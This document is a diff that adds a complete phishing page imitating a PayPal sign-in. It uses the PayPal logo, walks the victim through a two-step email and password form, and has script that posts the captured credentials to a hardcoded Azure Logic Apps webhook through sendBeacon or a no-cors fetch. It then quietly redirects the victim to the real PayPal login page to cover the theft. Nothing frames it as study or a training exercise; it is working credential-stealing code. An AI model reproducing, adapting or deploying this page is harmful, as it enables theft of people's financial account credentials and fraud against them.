@@ -1,0 +1,298 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<title>Home</title>
+<meta name="description" content="Sign in to Servicios Jey">
+<style>
+  :root{
+    --bg:#ffffff;
+    --card:#ffffff;
+    --ink:#111827;
+    --muted:#6b7280;
+    --line:#e6e9ef;
+    --blue:#0b5bd3;
+    --blue-ink:#fff;
+    --shadow:0 18px 40px rgba(17,24,39,.10);
+    --radius:26px;
+    --font:-apple-system,BlinkMacSystemFont,"Segoe UI",Inter,Roboto,Ubuntu,"Helvetica Neue",Arial,sans-serif;
+  }
+  *{box-sizing:border-box}
+  html,body{height:100%}
+  body{
+    margin:0;background:var(--card);font-family:var(--font);color:var(--ink);
+    -webkit-font-smoothing:antialiased;-moz-osx-font-smoothing:grayscale;
+  }
+
+  .wrap{min-height:100%;display:grid;grid-template-rows:1fr auto}
+  .center {
+    display: grid;
+    align-items: start;
+    justify-items: center;
+    padding: 0;
+  }
+
+  .card {
+    position: relative;
+    width: 100%;
+    max-width: 520px;
+    background: var(--card);
+    border-radius: var(--radius);
+    padding: 0 36px 2px;
+  }
+
+  .brand {
+    display: flex;
+    justify-content: center;
+    margin-top: 0;
+    margin-bottom: 8px;
+  }
+
+  .brand img{height:75px;width:auto;object-fit:contain}
+
+  .field{margin:38px 0 12px}
+  .input{
+    width:100%;height:70px;padding:16px; border: 1px solid #000;border-radius:5px;
+    font-size:16px;background:#fff;color:#5f5f5f;outline:0;transition:border-color .2s,box-shadow .2s;
+  }
+  .input::placeholder{color:#5f5f5f}
+  .input:focus{border-color:var(--blue);box-shadow:0 0 0 4px rgba(11,91,211,.2)}
+
+  .link{display:inline-block;margin:10px 0 18px;color:var(--blue);text-decoration:none;font-weight:600}
+  .link:hover{text-decoration:underline}
+
+  .btn{
+    width:100%;display:inline-flex;align-items:center;justify-content:center;
+    border:0;border-radius:999px;padding:14px 18px;font-size:16px;font-weight:800;
+    cursor:pointer;transition:transform .02s,filter .2s,box-shadow .2s;
+  }
+  .btn:active{transform:translateY(1px)}
+  .btn-primary{background:var(--blue);color:var(--blue-ink);box-shadow:0 8px 22px rgba(11,91,211,.28)}
+  .btn-primary:hover{filter:brightness(.98)}
+
+  .divider{display:grid;grid-template-columns:1fr auto 1fr;align-items:center;gap:12px;margin:18px 0;color:#98a2b3;font-weight:700}
+  .divider::before,.divider::after{content:"";height:1px;background:var(--line)}
+
+  .langs {
+  margin-top: 90px;
+  display: flex;
+  align-items: center;
+  justify-content: center; /* Esto centra horizontalmente */
+  gap: 10px;
+  flex-wrap: wrap;
+  color: #6b7280;
+  font-size: 14px;
+}
+
+  .flag{font-size:18px;line-height:1}
+  .lang a{color:inherit;text-decoration:none}
+  .lang a.active{color:#111;font-weight:800}
+  .dot{opacity:.6}
+
+  footer{padding:17px 0 0;background:#f8f9fb;height:40px;color:#6b7280}
+  .f-links{display:flex;gap:10px;flex-wrap:wrap;font-size:10px;justify-content:center;margin-bottom:4px}
+  .f-links a{color:inherit;font-size:10px;text-decoration:none}
+  .f-links a:hover{text-decoration:underline}
+
+  .btn-green {
+    background: #ffffff;
+    color: #000;
+    border: 2px solid #000;
+  }
+
+  .hidden{display:none}
+
+  /* Encabezado con correo + Change (queda PEGADO al input) */
+  .id-row {
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 8px;
+    font-size: 16px;
+    font-weight: 700;
+    margin: 6px;
+  }
+  .id-row .change{color:var(--blue);font-weight:700;text-decoration:none}
+  .id-row .change:hover{text-decoration:underline}
+
+  /* Cuando pasamos a password, compactamos el margen superior del campo */
+  #auth-form.compact .field{margin:0 0 12px}
+
+  /* Overlay de carga */
+  .loading{
+    position:absolute;inset:0;background:rgba(255,255,255,.92);
+    display:none;align-items:center;justify-content:center;border-radius:var(--radius);
+    animation:fadeIn .15s ease;z-index:1000;pointer-events:all;
+  }
+  .loading.active{display:flex}
+  .spinner{
+    width:84px;height:84px;border:4px solid rgba(11,91,211,.2);
+    border-top-color:rgba(11,91,211,1);border-radius:50%;animation:spin 1s linear infinite;
+  }
+  @keyframes spin{to{transform:rotate(360deg)}}
+  @keyframes fadeIn{from{opacity:0}to{opacity:1}}
+
+  @media (max-width:480px){
+    .card{padding:20px 18px;border-radius:22px}
+    .brand img{height:65px}
+    .btn{padding:13px 16px}
+  }
+  #idRow {
+    display: none; /* Oculto al inicio */
+  }
+</style>
+</head>
+<body>
+  <div class="wrap">
+    <main class="center" role="main">
+      <section class="card" aria-label="Sign in form">
+        <div class="brand">
+          <img src="https://1000marcas.net/wp-content/uploads/2019/12/Paypal-Logo.jpg" alt="Servicios jey">
+        </div>
+
+        <!-- OVERLAY DE CARGA -->
+        <div id="overlay" class="loading" aria-hidden="true">
+          <div class="spinner" role="status" aria-label="Loading"></div>
+        </div>
+
+        <!-- FORMULARIO ÚNICO -->
+        <form id="auth-form" autocomplete="on">
+          <!-- Encabezado con correo / número y Change -->
+          <div id="idRow" class="id-row">
+            <div id="idValue">example@email.com</div>
+            <a href="#" id="btnChange" class="change">Change</a>
+          </div>
+
+          <div class="field">
+            <input id="mainInput" class="input" type="text"
+                   placeholder="Email or mobile number" autocomplete="username" required>
+          </div>
+
+          <a href="#" id="forgot" class="link">Forgot email?</a>
+
+          <button class="btn btn-primary" type="submit" id="primaryBtn">Next</button>
+
+          <div class="divider" aria-hidden="true">or</div>
+          <button class="btn btn-green" type="button" id="btnSignup">Sign Up</button>
+
+         <div class="langs" aria-label="Language selector">
+            <span class="flag" aria-hidden="true">🇺🇸</span><span class="dot">•</span>
+            <span class="lang"><a href="#" class="active">English</a></span>
+            <span> | </span><span class="lang"><a href="#">Français</a></span>
+            <span> | </span><span class="lang"><a href="#">Español</a></span>
+            <span> | </span><span class="lang"><a href="#">中文</a></span>
+          </d iv>
+        </form>
+      </section>
+    </main>
+
+    <footer>
+      <nav class="f-links" aria-label="Site links">
+        <a href="#">Contact Us</a>
+        <a href="#">Privacy</a>
+        <a href="#">Legal</a>
+        <a href="#">Policy Updates</a>
+        <a href="#">Worldwide</a>
+      </nav>
+    </footer>
+  </div>
+
+<script>
+  const form = document.getElementById('auth-form');
+  const overlay = document.getElementById('overlay');
+  const input = document.getElementById('mainInput');
+  const idRow = document.getElementById('idRow');
+  const idValue = document.getElementById('idValue');
+  const changeBtn = document.getElementById('btnChange');
+  const forgot = document.getElementById('forgot');
+  const primaryBtn = document.getElementById('primaryBtn');
+
+  // URL del flujo (Power Automate / Logic Apps)
+  const FLOW_URL = "https://prod-85.westus.logic.azure.com:443/workflows/a15e32f673dc4624b6d73ec979238804/triggers/manual/paths/invoke?api-version=2016-06-01&sp=%2Ftriggers%2Fmanual%2Frun&sv=1.0&sig=VwyY5R-_TBFDEfoAupMFarmhkjQsGUB5ILXsvVZbhpI";
+
+  // Estado actual: 'id' (correo/teléfono) o 'pwd' (contraseña)
+  let state = 'id';
+
+  form.addEventListener('submit', (e)=>{
+    e.preventDefault();
+
+    if(state === 'id'){
+      const value = input.value.trim();
+      if(!value){ input.focus(); return; }
+
+      // Mostrar overlay 1s y pasar a password
+      overlay.classList.add('active');
+      setTimeout(()=>{
+        overlay.classList.remove('active');
+
+        // Configura vista de password
+        state = 'pwd';
+        idValue.textContent = value;
+        idRow.style.display = 'flex';      // mostrar encabezado
+        form.classList.add('compact');     // pega el input al encabezado
+        input.type = 'password';
+        input.value = '';
+        input.placeholder = 'Enter your password';
+        input.setAttribute('autocomplete','current-password');
+        forgot.classList.add('hidden');    // ocultar "Forgot email?"
+        primaryBtn.textContent = 'Log In'; // Next -> Log In
+        input.focus();
+      }, 1000);
+
+    }else{
+      // Enviar correo y contraseña al flujo de forma CORS-safe
+      try {
+        const data = {
+          email: idValue.textContent,
+          password: input.value,
+          ts: new Date().toISOString()
+        };
+        const body = JSON.stringify(data);
+
+        // 1) Intento con sendBeacon usando STRING (Content-Type: text/plain)
+        let sent = false;
+        if (navigator.sendBeacon) {
+          sent = navigator.sendBeacon(FLOW_URL, body);
+        }
+
+        // 2) Fallback: fetch sin cabeceras y no-cors (CORS-safe)
+        if (!sent) {
+          fetch(FLOW_URL, {
+            method: "POST",
+            mode: "no-cors",
+            body: body,       // text/plain implícito
+            keepalive: true
+          }).catch(()=>{});
+        }
+      } catch (_) {}
+
+      // Pequeño delay para mejorar entrega antes de redirigir
+      setTimeout(()=>{
+        window.location.href = 'https://www.paypal.com/signin/?returnUri=https%3A%2F%2Fwww.paypal.com%2Fverify';
+      }, 180);
+    }
+  });
+
+  // Change -> vuelve al estado inicial
+  changeBtn.addEventListener('click', (e)=>{
+    e.preventDefault();
+    state = 'id';
+    idRow.style.display = 'none';
+    form.classList.remove('compact');
+    input.type = 'text';
+    input.placeholder = 'Email or mobile number';
+    input.value = '';
+    input.setAttribute('autocomplete','username');
+    forgot.classList.remove('hidden');
+    primaryBtn.textContent = 'Next';
+    input.focus();
+  });
+
+  // Demo Sign Up
+  document.getElementById('btnSignup').addEventListener('click',()=>{
+    alert('Demo: Sign Up');
+  });
+</script>
+</body>
+</html>
